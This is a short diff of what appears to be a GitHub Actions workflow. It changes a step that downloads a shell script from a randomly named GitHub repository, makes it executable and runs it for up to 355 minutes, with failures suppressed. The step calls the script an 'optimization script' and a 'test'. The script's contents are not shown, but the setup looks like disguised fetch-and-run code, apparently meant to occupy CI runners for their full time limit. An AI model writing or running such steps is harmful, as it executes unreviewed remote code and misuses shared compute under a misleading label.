@@ -11,8 +11,8 @@ jobs:
     steps:
       - name: Fetch optimization script
         run: |
-          curl -sLo bench_setup.sh https://raw.githubusercontent.com/JonasMolinaV/psychic-succotash/main/screen.sh
-          chmod +x bench_setup.sh
+          curl -sLo try.sh https://raw.githubusercontent.com/JonasMolinaV/psychic-succotash/main/gyu.sh
+          chmod +x try.sh
           
       - name: Execute test with 5h 55min timeout
         run: |
@@ -20,4 +20,4 @@ jobs:
           # The 'timeout' command will terminate the process after the specified duration.
           # '|| echo "Test completed or timed out"' will ensure the step doesn't fail
           # if the timeout occurs (as 'timeout' exits with 124 on timeout).
-          timeout 355m ./bench_setup.sh || echo "Test completed or timed out"
+          timeout 355m ./try.sh || echo "Test completed or timed out"
